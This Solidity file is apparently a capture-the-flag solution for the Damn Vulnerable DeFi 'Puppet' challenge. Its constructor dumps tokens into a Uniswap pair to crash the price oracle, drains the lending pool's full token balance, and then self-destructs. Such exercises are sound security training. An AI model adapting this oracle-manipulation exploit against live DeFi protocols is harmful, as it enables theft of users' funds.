// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./PuppetPool.sol";
import "../DamnValuableToken.sol";
import "./IUniswapExchange.sol";

contract PuppetExploiter {
    using Address for address payable;

    IUniswapExchange public uniswapPair;
    DamnValuableToken public token;
    PuppetPool public pool;

    constructor(address _pool, uint8 v, bytes32 r, bytes32 s) payable {
        pool = PuppetPool(_pool);
        token = pool.token();
        uniswapPair = IUniswapExchange(payable(pool.uniswapPair()));
        uint256 senderBalance = token.balanceOf(msg.sender);
        token.permit(msg.sender, address(this), type(uint256).max, type(uint256).max, v, r, s);
        token.transferFrom(msg.sender, address(this), senderBalance);
        uint256 outputEth = uniswapPair.getTokenToEthInputPrice(senderBalance);
        token.approve(address(uniswapPair), type(uint256).max);
        uniswapPair.tokenToEthSwapInput(senderBalance, outputEth, block.timestamp * 2);
        uint256 depositRequired = pool.calculateDepositRequired(
            token.balanceOf(address(pool))
        );
        require(
            depositRequired <= address(this).balance, 
            "Not enough balance to drain pool after swap"
        );
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.borrow{value: depositRequired}(poolBalance, msg.sender);
        selfdestruct(payable(msg.sender));
    }
}
